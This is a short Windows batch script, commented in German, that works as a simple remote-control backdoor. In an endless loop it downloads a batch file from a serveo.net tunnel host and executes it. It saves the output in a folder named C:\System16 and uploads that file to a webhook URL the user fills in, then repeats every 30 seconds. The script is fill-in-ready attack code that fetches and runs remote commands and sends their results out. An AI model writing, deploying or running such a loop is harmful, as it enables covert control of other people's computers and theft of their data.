@echo off
:start
cd C:\System16\
set OUTPUT_FILE=output.txt
curl http://your_hostname.serveo.net/run.bat -o C:\System16\run.bat

call C:\System16\run.bat > %OUTPUT_FILE% 2>&1

echo -----------------------------------------
echo Ausführung abgeschlossen. Der Output wurde in %OUTPUT_FILE% gespeichert.


set WEBHOOK_URL=<YOUR WEBHOOK URL>
set DATEIPFAD=C:\System16\output.txt
curl -X POST -H "Content-Type: multipart/form-data"  -F "file=@%DATEIPFAD%" %WEBHOOK_URL%


timeout 30
goto start